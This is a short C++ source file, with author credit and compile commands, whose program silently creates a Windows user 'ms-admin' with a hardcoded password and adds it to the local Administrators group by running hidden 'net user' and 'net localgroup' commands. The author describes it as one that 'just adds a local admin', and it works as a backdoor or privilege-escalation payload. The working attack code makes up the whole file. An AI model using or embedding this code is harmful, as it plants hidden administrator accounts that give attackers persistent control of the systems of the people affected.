/* Author: Morgan Storey (@MorganKStorey)
g++ -c program.cpp & g++ -o program.exe program.o
Really simple, just adds a local admin. 
To do, add output to a log file so you can see what user etc called it... knowledge is power
*/
#include <windows.h>
int main(void)
{
 WinExec("cmd.exe /c net user ms-admin PW-AllStar#1 /add ", 0);
 Sleep(3000); 
 WinExec("cmd.exe /c net localgroup Administrators ms-admin /add ", 0);
 Sleep(2000); 
         return 0;
};
